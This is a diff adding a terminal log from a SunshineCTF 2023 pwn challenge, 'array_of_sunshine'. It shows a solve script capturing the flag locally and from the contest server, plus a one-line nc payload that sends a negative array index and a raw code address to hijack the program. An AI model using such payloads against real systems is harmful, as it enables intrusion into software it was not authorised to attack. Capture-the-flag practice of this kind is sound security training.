@@ -1,0 +1,77 @@
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/pwn/array_of_sunshine]
+└─$ ./solve.py
+[+] Starting local process '/home/kali/Documents/sunshinectf2023/pwn/array_of_sunshine/sunshine': pid 682228
+ArG: -8
+[+]
+
+
+    WINNER: Type of new fruit >>>sun{THIS_IS_A_FAKE_FLAG}
+
+
+
+[*] Stopped process '/home/kali/Documents/sunshinectf2023/pwn/array_of_sunshine/sunshine' (pid 682228)
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/pwn/array_of_sunshine]
+└─$ ./solve.py REMOTE
+[+] Opening connection to chal.2023.sunshinectf.games on port 23003: Done
+ArG: -8
+[+]
+
+
+    WINNER: Type of new fruit >>>sun{a_ray_of_sunshine_bouncing_around}
+
+
+
+[*] Closed connection to chal.2023.sunshinectf.games port 23003
+
+
+# Also:
+
+┌──(kali㉿kali)-[~/Documents/sunshinectf2023/pwn/array_of_sunshine]
+└─$ echo -ne '-8\x8f\x12\x40\x00\x00\x00\x00\x00\x0a' | nc chal.2023.sunshinectf.games 23003
+MMMMMMMMMMMMMMMMMMMMMMMMMWx..cONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMXkc..;xNMMMMWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMWN0xollloxOXNKd,.,kNWOccclodkO0XNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMNkc'         .:kNXx'.:0k.       ...,;:lodk0WMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMNx,           ...'dNMXl.'do.               .oNMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMW0;          .....  cNMMWk'.oxl;            'dNMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMWx.         ...      oWMMMM0,.dXXOl;......,ckXMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMNo.       ...        '0MMMMMM0,.;xWMWXK00KXWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMNo.                  'OWMMMMMMWk. ,KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMWx.                 .oKWMMMWWNNNXl..oWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMO'              .,cxKX0koc:,'''''.. .:cc:cclodk0XWMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMW0l::;;;;;;:cloxOKKOo;..                        ..,cd0NMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMWWWWWWMMMMNOc'                                  .'ckNMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMXd,                                ..       'oKWMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMXd'                                  ..         .oKMMMMMMMMMMMMM
+MMMMMMMMMMMMMMWk,                                                 'xNMMMMMMMMMMM
+MMMMMMMMMMMMMXl.                                         .'.        cKMMMMMMMMMM
+MMMMMMMMMMMMK:                                           .'          ;0MMMMMMMMM
+MMMMMMMMMMMK:                                                         ,0MMMMMMMM
+MMMMMMMMMMNc                                                           :XMMMMMMM
+MMMMMMMMMWx.                                              ..     '.     oWMMMMMM
+MMMMMMMMMX;                                                      .      '0MMMMMM
+MMMMMMMMMk.                                                             .dWMMMMM
+MMMMMMMMWo                                                        .      lNMMMMM
+MMMMMMMMWl                                                        .      :NMMMMM
+MMMMMMMMWo                                                               cNMMMMM
+MMMMMMMMMx.                                                              oWMMMMM
+MMMMMMMMM0'                                                             .OMMMMMM
+MMMMMMMMMWl                                                             cNMMMMMM
+MMMMMMMMMMK,                                                           'OMMMMMMM
+MMMMMMMMMMWO'                                                         .xWMMMMMMM
+MMMMMMMMMMMWk'                                                       .xWMMMMMMMM
+MMMMMMMMMMMMWO,                                                     'kWMMMMMMMMM
+MMMMMMMMMMMMMMXl.                                                 .cKWMMMMMMMMMM
+MMMMMMMMMMMMMMMWO;                                               ,kNMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMNk;.                                          ,xNMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMWOl'                                     .cONMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMNkl,.                             .'ckXWMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMN0xl;..                   ..;lx0NMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXOo:,..         ..':okKWMMMMMMMMMMMMMMMMMMMMMMMMMM
+
+Which fruit would you like to eat [0-3] >>> Replace it with a new fruit.
+Type of new fruit >>>sun{a_ray_of_sunshine_bouncing_around}
+
+Which fruit would you like to eat [0-3] >>> ^C
+
